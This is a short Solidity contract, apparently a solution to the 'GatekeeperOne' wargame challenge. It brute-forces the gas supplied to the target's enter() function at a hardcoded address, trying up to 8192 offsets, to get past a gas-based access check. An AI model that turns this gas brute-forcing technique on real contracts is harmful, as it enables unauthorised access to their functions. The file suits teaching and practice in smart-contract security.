// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract HackGatekeeperOne {

    event Log(uint256 message);
    GatekeeperOne public vulnerableContract = GatekeeperOne(0x47A7E21F8A8A30c4EFd5C7AFec6E81421f63acDd);

    function enterGate(bytes8 gateKey) external {
        for (uint256 i=0; i<=8191; i++) {
            try vulnerableContract.enter{gas: 20000 + i}(gateKey) {
                emit Log(i);
                break;
            }
            catch {
            }
        }
    }
}